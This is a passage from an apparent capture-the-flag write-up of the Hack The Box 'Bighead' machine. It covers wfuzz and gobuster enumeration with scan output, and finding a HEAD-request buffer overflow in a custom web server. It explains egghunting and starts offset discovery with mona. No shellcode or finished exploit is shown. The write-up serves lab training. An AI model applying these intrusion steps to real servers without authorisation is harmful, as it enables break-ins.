mailer.bighead.htb/testlink which shows this error : In the background I ran gobuster on bachmanity.htb and bighead.htb with /usr/share/wordlists/dirb/common.txt. bachmanity.htb didn’t have anything : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://bachmanity.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/24 20:21:01 Starting gobuster ===================================================== /index.html (Status: 200) /index.htm (Status: 200) but bighead.htb gave some results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://bighead.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/24 20:16:23 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /assets (Status: 301) /backend (Status: 302) /Images (Status: 301) /images (Status: 301) /index.html (Status: 200) I went to /assets and it was forbidden : /backend redirected the browser to bighead.htb/BigHead which gave the same error we saw before : I clicked on error log and it gave the same error : Let’s check if there are any other subdomains. I used wfuzz with subdomains-top1mil-5000.txt from seclists: wfuzz -c -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.bighead.htb&quot; http://10.10.10.112 non-valid subdomain responses are 11232 chars so we will remove those from the output : wfuzz -c --hh 11232 -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.bighead.htb&quot; http://10.10.10.112 We got 3 subdomains : dev, mailer and code. We already know about mailer, let’s add dev and code : code.bighead.htb redirected the browser to 127.0.0.1:5080/testlink/login.php So to see what’s on code.bighead.htb we will probably need to forward an internal service to our box. We can’t do that now so we will ignore code.bighead.htb for now. dev.bighead.htb shows this image of bighead : Source has nothing interesting : I ran gobuster again and got some results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://dev.bighead.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/24 20:55:05 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /blog (Status: 302) /blog_ajax (Status: 302) /blog_inlinemod (Status: 302) /blog_usercp (Status: 302) /blog_search (Status: 302) /blog_report (Status: 302) /blogger (Status: 302) /blogindex (Status: 302) /bloggers (Status: 302) /blogs (Status: 302) /blogspot (Status: 302) /wp-content (Status: 302) But all these pages gave this result : I intercepted the request in burp to figure out why : The response is 302, by following the redirect : It responds with another 302 So it will keep redirecting us in a loop and we won’t get anything. At this point I didn’t know what to do because all of my attempts have hit a dead end. I did a sub directory bruteforce again with wfuzz instead of gobuster and I got one more result : wfuzz --hc 404 -c -w /usr/share/wordlists/dirb/common.txt -u http://dev.bighead.htb/FUZZ The reason why gobuster didn’t show us this page is because of the status code. gobuster only showed results with these status codes : [+] Status codes : 200,204,301,302,307,403, While wfuzz showed everything except 404 responses, --hc 404. /coffee gave a response of 418 which is weird. I looked it up and found some info about it here. 418 I'm a teapot ! Anyway let’s take a look : http://dev.bighead.htb/coffee It’s showing this gif : Which is saying : “The requested entity body is short and stout. Tip me over and pour me out.” ?! I intercepted the request with burp and looked at the response : I noticed a weird server name : BigheadWebSvr 1.0. I looked it up and found a repository on the machine creator’s github (3mrgnc3) : I searched through the commits and got this one which seemed to be the right one. It asked for a password : I tried to guess it and after some attempts bighead worked : Of course it’s a windows executable so we will switch to a windows machine. At this point the hint was quite obvious : “The requested entity body is short and stout. Tip me over and pour me out.”, This server is probably vulnerable to a buffer overflow. Buffer Overflow in BigheadWebSvr I tried to run the server but it complained about some missing dll called libmingwex-0.dll : So I installed mingw and copied the dll to the same directory as the server : Then I had to allow access for it : Now the server is running : But not on port 80 : I did netstat -a -b and found that it’s running on port 8008 : Great, I intercepted the request with burp then I ran the server again with Immunity Debugger : Now we need to know how to make the server crash. First thing I wanted to try was sending a HEAD request, because you know … the machine name is BigHead :D And yes it worked. The EIP was overwritten with A. I tried to send a bigger request and the server didn’t crash, and that was a bit of a problem because we are limited to a specific size so we don’t have enough space to store our shellcode, That’s why we will use egghunting. There are a lot of great tutorials about win32 egghunting out there so I will just give you an idea of what is egghunting in case you don’t know. When we don’t have enough space on the stack to hold the shellcode, instead of sending and executing the shellcode we send a very small string called egghunter. When that egghunter is executed it searches through the entire memory for an egg. when it hits that egg it executes what’s after it (the shellcode). The egg is a 4-bytes string, say for example R1ck that egg is doubled and added before the shellcode like this : R1ckR1ck + shellcode. It’s explained very well in skape’s paper Safely Searching Process Virtual Address Space. There are also many practical tutorials just search for win32 egghunting. Now back to the vulnerable server, first thing we need to know is the offset. I’m using mona plugin. Documentation !mona config -set workingfolder c:\logs\%p, to make mona output to C:\logs To find the offset we will create a pattern !mona pc 100 (creates a pattern of 100 chars), this is the same as pattern_create.rb from metasploit. I used it in my buffer overflow write-ups. It will put the output in a file called pattern.txt in C:\logs : Pattern : Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Full output : ``` ================================================================================ Output generated by mona.py v2.0, rev 585 - Immunity Debugger Corelan Team - https://www.corelan.be ================================================================================ Process being debugged : BigheadWebSvr (pid 1300) Current mona arguments: pc 100 ================================================================================ 2019-04-24 22:43:44 ================================================================================</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/bighead/0.png" /></entry></feed>